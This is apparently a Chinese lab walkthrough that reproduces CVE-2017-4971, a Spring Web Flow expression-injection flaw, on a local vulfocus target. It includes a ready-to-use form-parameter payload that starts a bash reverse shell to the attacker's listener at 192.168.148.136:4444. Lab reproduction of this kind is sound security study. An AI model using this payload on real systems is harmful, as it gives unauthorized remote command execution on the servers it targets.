环境信息

攻击机：192.168.148.136

靶机：192.168.148.146

靶场环境：本地部署vulfocus

漏洞编号：CVE-2017-4971

漏洞描述：Spring Web Flow建立在Spring MVC之上，并允许实现Web应用程序的“流” 由于没有明确指定相关 model 的具体属性导致从表单可以提交恶意的表达式从而被执行，导致任意代码执行的漏洞。

影响版本：Spring Web Flow 2.4.0 – 2.4.4

利用方式：代码执行

触发条件：binder节点为空useSpringBeanBinding 默认值（false）未修改

 

漏洞复现：

进入目标站点

点击Proceed然后会跳转到Confirm页面Burp抓取数据包

Burp抓取数据包

反弹shell

&_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.148.136/4444+0>%261")).start()=vulhub

 

攻击机开启监听

发送构造好的数据包

查看回显接收到反弹的shell
